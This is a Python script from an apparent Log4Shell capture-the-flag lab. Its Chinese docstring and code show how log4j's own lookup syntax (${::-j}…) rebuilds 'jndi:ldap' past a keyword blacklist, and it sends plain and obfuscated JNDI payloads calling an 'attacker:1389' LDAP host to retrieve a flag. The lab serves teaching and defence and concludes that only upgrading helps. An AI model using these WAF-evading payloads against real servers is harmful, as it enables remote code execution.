"""L3 · 绕过关键字黑名单：log4j 自己会把关键字拼回来

应用端加了一层很常见的"防护"：把 User-Agent 里的 jndi / ldap 抹掉。
对普通字符串过滤是有效的，但 log4j 的 lookup 语法本身就能造字符：

    ${::-j}   →  j       （${name:-default}，name 为空时取 default）
    ${::-n}   →  n
    ...

于是关键字根本不以连续字符串出现，黑名单一个字都匹配不到，
等 log4j 递归展开完，摆在那里的还是 jndi:ldap://...。

这正是当年 WAF 规则大面积失效的原因：过滤发生在 log4j 解析**之前**，
而攻击串是在解析**过程中**才成形的。

顺带一个实测现象：2.14.1 对这种嵌套 ${...} 会做多轮递归替换，每轮都重新
执行一次 JNDI lookup，所以下面事件里整条链会重复 9 次（显示成 ×9）。
不是脚本重发了请求，是组件自己的行为 —— 真实环境里这就是一次请求放大，
也是为什么混淆 payload 特别容易把 IDS 告警打爆。

跑法：python3 03_bypass.py
"""

import sys

from _util import APP, find_flag, inject, kinds, reset, show_events, wait

PLAIN = "${jndi:ldap://attacker:1389/l3}"
OBFUSCATED = (
    "${${::-j}${::-n}${::-d}${::-i}:"
    "${::-l}${::-d}${::-a}${::-p}://attacker:1389/l3}"
)


def main():
    reset()
    print("L3 · /filtered 端点上的天真黑名单\n")

    # ---- 第一步：证明过滤确实在工作 -------------------------------------
    print("  ① 先老老实实发：%s" % PLAIN)
    status, body = inject(APP, PLAIN, path="/filtered")
    for line in body.strip().splitlines():
        if line.startswith("logged_ua=") or line.startswith("filtered="):
            print("     " + line)
    snap = wait(lambda s: any(e.get("kind") == "ldap_search" for e in s), timeout=3)
    if kinds(snap, "ldap_search"):
        print("  [-] 竟然还有回连？过滤没生效，检查 8080 是不是 filter 模式", file=sys.stderr)
        return 1
    print("     没有任何 LDAP 回连 —— 看起来挡住了。\n")

    # ---- 第二步：用 lookup 语法把关键字拼回来 ---------------------------
    reset()
    print("  ② 换成 log4j 自己的语法：")
    print("     %s" % OBFUSCATED)
    print("     里面既没有连续的 jndi，也没有连续的 ldap。\n")
    inject(APP, OBFUSCATED, path="/filtered")

    snap = wait(lambda s: any(e.get("kind") == "collect" for e in s))
    print("=== 攻击者侧看到的事件 ===")
    show_events(snap)

    f = find_flag(snap)
    if not f:
        print("\n[-] 没拿到 L3 flag。", file=sys.stderr)
        return 1

    print("\n[+] L3 flag: %s" % f)
    print("\n结论：靠删关键字挡不住 Log4Shell，唯一可靠的是升级组件"
          "（或在无法升级时彻底关掉 lookup）。\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
